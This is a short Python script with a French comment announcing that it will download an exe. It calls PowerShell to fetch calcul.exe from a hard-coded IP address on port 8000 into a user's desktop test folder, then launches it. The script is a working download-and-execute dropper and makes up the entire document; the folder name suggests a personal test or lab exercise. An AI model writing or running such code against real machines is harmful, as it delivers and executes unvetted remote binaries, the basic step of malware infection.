import os

def main():
    print(u"Ici va télécharger l'exe")
    try:
        os.system("powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('http://54.90.113.98:8000/calcul.exe', 'C:\\Users\\Clément\\Desktop\\Test\\calcul.exe')")
        os.popen("powershell.exe -Command Invoke-Item C:\\Users\\Clément\\Desktop\\Test\\calcul.exe")
        return True
    except:
        return False

main()
